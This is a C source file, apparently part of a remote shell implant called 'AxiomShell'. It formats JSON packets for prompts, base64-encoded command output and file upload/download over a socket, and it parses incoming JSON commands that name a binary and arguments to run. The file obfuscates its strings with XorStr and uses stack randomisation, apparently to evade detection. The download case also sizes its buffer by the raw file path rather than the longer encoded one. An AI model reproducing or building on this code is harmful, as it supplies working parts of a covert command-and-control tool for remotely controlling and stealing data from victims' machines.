#include <stdio.h>
#include "AxiomShell.h"
#include "Glibc.h"
#include "Utils.h"
#include "json.h"
#include "autoxor.h"

void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args)
{
	STACK_RANDOMIZER;
	char *prompt;
	char *output;
	char *b64output;
	char *answer;
	SIZE_T answer_len;
	SIZE_T bytesSent;
	PJSON_RAW_BINARY_ARGS rawOutput;
	PJSON_READY_FOR_DOWNLOAD_ARGS downloadArgs;
	const char *scaffhold_RFI = XorStr("{\"status\":\"READY_FOR_INPUT\",\"prompt\":\"%s\"}");
	const char *scaffhold_CO = XorStr("{\"status\":\"COMMAND_OUTPUT\",\"content\":\"%s\"}");
	const char *scaffhold_RFD = XorStr("{\"status\":\"READY_FOR_DOWNLOAD\",\"local_filepath\":\"%s\",\"filelen\":%lld}");
	const char *scaffhold_RFU = XorStr("{\"status\":\"READY_FOR_UPLOAD\",\"local_filepath\":\"%s\"}");

	switch (packetType)
	{
		case JsonReadyForInput:
			prompt = UTILS_get_command_prompt();
			answer_len = strlen(scaffhold_RFI) + strlen(prompt) + 1;
			answer = (char *)malloc(answer_len);
			snprintf(answer, answer_len, scaffhold_RFI, prompt);
			free(prompt);
			break;
		case JsonCommandOutput:
			output = (char *)args;
			b64output = WRAPPER_base64_encode(output);
			answer_len = strlen(scaffhold_CO) + strlen(b64output) + 1;
			answer = (char *)malloc(answer_len);
			snprintf(answer, answer_len, scaffhold_CO, b64output);
			free(b64output);
			break;
		case JsonRawBinary:
			rawOutput = (PJSON_RAW_BINARY_ARGS)args;
			b64output = WRAPPER_base64_encode_binary((char *)rawOutput->buffer, rawOutput->bufferlen);
			answer_len = strlen(scaffhold_CO) + strlen(b64output) + 1;
			answer = (char *)malloc(answer_len);
			snprintf(answer, answer_len, scaffhold_CO, b64output);
			free(b64output);
			break;
		case JsonReadyForDownload:
			downloadArgs = (PJSON_READY_FOR_DOWNLOAD_ARGS)args;
			b64output = WRAPPER_base64_encode(downloadArgs->local_filepath);
			answer_len = strlen(scaffhold_RFD) + strlen(downloadArgs->local_filepath) + 20; // enough for a big filesize
			answer = (char *)malloc(answer_len);
			snprintf(answer, answer_len, scaffhold_RFD, b64output, downloadArgs->filelen);
			free(b64output);
			break;
		case JsonReadyForUpload:
			b64output = WRAPPER_base64_encode((char *)args);
			answer_len = strlen(scaffhold_RFD) + strlen(b64output) + 1;
			answer = (char *)malloc(answer_len);
			snprintf(answer, answer_len, scaffhold_RFU, b64output);
			free(b64output);
			break;
		default:
			DEBUG_LOG("[!] Invalid packet type: %d\n", (int)packetType);
			return;
	}
	bytesSent = NETWORK_send_packet(sock, answer, -1); (void)bytesSent;
	DEBUG_LOG("[+] Sent %lld bytes\n", bytesSent);
	free(answer);
}

PCOMMAND JSON_parse_packet(char *raw_packet)
{
	STACK_RANDOMIZER;
	PCOMMAND result;
	const char *type;
	const char *binary;
	const char *tmp;
	size_t argumentsCount;
	char **commandArguments;
	enum CommandType commandType;

	result(json_element) element_result = json_parse(raw_packet);
	typed(json_element) element = result_unwrap(json_element)(&element_result);

	// Read packet type
	result(json_element) type_element_result = json_object_find(element.value.as_object, "type");
	typed(json_element) type_element = result_unwrap(json_element)(&type_element_result);
	type = type_element.value.as_string;
	DEBUG_LOG("[-] Type: %s\n", type);
	if (drunk_strcmp(type, "BUILTIN") == 0)
		commandType = CommandBuiltin;
	else if (drunk_strcmp(type, "COMMAND") == 0)
		commandType = CommandCommand;
	else {
		DEBUG_LOG("[!] Unsupported command type: %s\n", type);
		return (NULL);
	}

	// Read binary
	result(json_element) binary_element_result = json_object_find(element.value.as_object, "binary");
	typed(json_element) binary_element = result_unwrap(json_element)(&binary_element_result);
	binary = binary_element.value.as_string;
	DEBUG_LOG("[-] Binary: %s\n", binary);

	// Read arguments
	result(json_element) arguments_element_result = json_object_find(element.value.as_object, "arguments");
	typed(json_element) arguments_element = result_unwrap(json_element)(&arguments_element_result);
	typed(json_array) *arguments = arguments_element.value.as_array;
	argumentsCount = (arguments != NULL) ? arguments->count : 0;
	DEBUG_LOG("[-] %lld arguments\n", argumentsCount);

	commandArguments = (char **)malloc(sizeof(char *) * argumentsCount);
	for (size_t i = 0; i < argumentsCount; i++)
	{
		typed(json_element) argi = arguments->elements[i];
		tmp = argi.value.as_string;
		commandArguments[i] = (char *)drunk_strdup(tmp);
		DEBUG_LOG("[-] Argument %lld: %s (0x%p)\n", i, tmp, commandArguments[i]);
	}

	// Json object not needed anymore
	json_free(&element);

	result = (PCOMMAND)malloc(sizeof(COMMAND));
	result->commandType = commandType;
	result->binary = (char *)drunk_strdup(binary);
	result->argumentCount = argumentsCount;
	result->arguments = commandArguments;

	return (result);
}

void JSON_free_command(PCOMMAND cmd)
{
	size_t i;

	i = 0;
	free(cmd->binary);
	while (i < cmd->argumentCount)
	{
		free(cmd->arguments[i]);
		i++;
	}
	free(cmd->arguments);
	free(cmd);
}

